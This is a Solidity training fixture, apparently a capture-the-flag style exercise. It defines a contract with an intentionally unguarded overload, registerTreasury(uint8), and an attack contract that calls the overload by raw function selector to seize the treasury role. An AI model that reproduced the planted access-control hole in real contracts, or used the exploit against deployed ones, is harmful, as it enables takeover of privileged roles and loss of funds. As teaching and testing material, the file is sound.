// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

contract HigherOrder {
    address public treasury;
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function registerTreasury() public {
        require(msg.sender == owner, "not owner");
        treasury = msg.sender;
    }

    function registerTreasury(uint8) public {
        // Intended to receive the gov's signature; unguarded on purpose.
        treasury = msg.sender;
    }
}

contract HigherOrderAttack {
    function attack(HigherOrder target) external {
        // Call the unguarded overload registerTreasury(uint8) by raw
        // selector: bytes4(keccak256("registerTreasury(uint8)")).
        (bool ok,) = address(target).call(
            abi.encodeWithSelector(bytes4(0x211c85ab), uint8(0))
        );
        require(ok, "register failed");
    }
}

// Local training fixture: the unguarded `registerTreasury(uint8)` lets any
// caller become the treasury via an overloaded but unprotected path.

